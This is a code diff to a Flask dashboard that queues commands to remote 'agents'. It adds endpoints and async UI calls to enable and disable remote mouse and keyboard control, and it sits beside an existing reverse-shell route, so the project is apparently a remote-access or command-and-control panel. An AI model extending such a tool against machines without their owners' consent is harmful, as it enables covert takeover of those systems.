@@ -1359,32 +1359,60 @@ DASHBOARD_HTML = """
         let syncKeyboard = true;
         let remoteControlArea = null;
 
-        function startRemoteControl() {
+        async function startRemoteControl() {
             if (!selectedAgentId) {
                 showStatus('Please select an agent first.', 'error');
                 return;
             }
 
-            remoteControlActive = true;
-            remoteControlArea = document.getElementById('remote-control-area');
-            const instructions = document.getElementById('remote-instructions');
-            const mouseCursor = document.getElementById('mouse-cursor');
-            const statusDiv = document.getElementById('remote-status');
+            try {
+                // Enable remote control on the agent
+                const response = await fetch(`/enable_remote_control/${selectedAgentId}`, {
+                    method: 'POST'
+                });
+                
+                if (!response.ok) {
+                    throw new Error('Failed to enable remote control on agent');
+                }
 
-            // Update UI
-            instructions.style.display = 'none';
-            mouseCursor.style.display = 'block';
-            statusDiv.style.display = 'block';
-            statusDiv.className = 'status-indicator status-success';
-            statusDiv.textContent = `Remote control active for agent ${selectedAgentId}`;
+                remoteControlActive = true;
+                remoteControlArea = document.getElementById('remote-control-area');
+                const instructions = document.getElementById('remote-instructions');
+                const mouseCursor = document.getElementById('mouse-cursor');
+                const statusDiv = document.getElementById('remote-status');
 
-            // Set up event listeners
-            setupRemoteControlListeners();
-            
-            showStatus('Remote control started successfully!', 'success');
+                // Update UI
+                instructions.style.display = 'none';
+                mouseCursor.style.display = 'block';
+                statusDiv.style.display = 'block';
+                statusDiv.className = 'status-indicator status-success';
+                statusDiv.textContent = `Remote control active for agent ${selectedAgentId}`;
+
+                // Set up event listeners
+                setupRemoteControlListeners();
+                
+                showStatus('Remote control started successfully!', 'success');
+            } catch (error) {
+                showStatus('Failed to start remote control: ' + error.message, 'error');
+            }
         }
 
-        function stopRemoteControl() {
+        async function stopRemoteControl() {
+            if (selectedAgentId) {
+                try {
+                    // Disable remote control on the agent
+                    const response = await fetch(`/disable_remote_control/${selectedAgentId}`, {
+                        method: 'POST'
+                    });
+                    
+                    if (!response.ok) {
+                        console.warn('Failed to disable remote control on agent, but continuing with UI cleanup');
+                    }
+                } catch (error) {
+                    console.warn('Error disabling remote control on agent:', error);
+                }
+            }
+
             remoteControlActive = false;
             remoteControlArea = null;
             const instructions = document.getElementById('remote-instructions');
@@ -2026,6 +2054,39 @@ def remote_control():
     AGENTS_DATA[agent_id]["commands"].append(json.dumps(remote_command))
     
     return jsonify({"status": "success"})
+
+@app.route("/enable_remote_control/<agent_id>", methods=["POST"])
+def enable_remote_control_endpoint(agent_id):
+    """Enable remote control for a specific agent."""
+    if agent_id not in AGENTS_DATA:
+        return jsonify({"status": "error", "message": "Agent not found"}), 404
+    
+    # Send enable command to agent
+    AGENTS_DATA[agent_id]["commands"].append("enable-remote-control")
+    
+    return jsonify({"status": "success", "message": "Remote control enable command sent"})
+
+@app.route("/disable_remote_control/<agent_id>", methods=["POST"])
+def disable_remote_control_endpoint(agent_id):
+    """Disable remote control for a specific agent."""
+    if agent_id not in AGENTS_DATA:
+        return jsonify({"status": "error", "message": "Agent not found"}), 404
+    
+    # Send disable command to agent
+    AGENTS_DATA[agent_id]["commands"].append("disable-remote-control")
+    
+    return jsonify({"status": "success", "message": "Remote control disable command sent"})
+
+@app.route("/remote_control_status/<agent_id>", methods=["GET"])
+def remote_control_status_endpoint(agent_id):
+    """Get remote control status for a specific agent."""
+    if agent_id not in AGENTS_DATA:
+        return jsonify({"status": "error", "message": "Agent not found"}), 404
+    
+    # Send status command to agent
+    AGENTS_DATA[agent_id]["commands"].append("remote-control-status")
+    
+    return jsonify({"status": "success", "message": "Remote control status command sent"})
 
 @app.route("/reverse_shell/<agent_id>", methods=["POST"])
 def reverse_shell_command(agent_id):
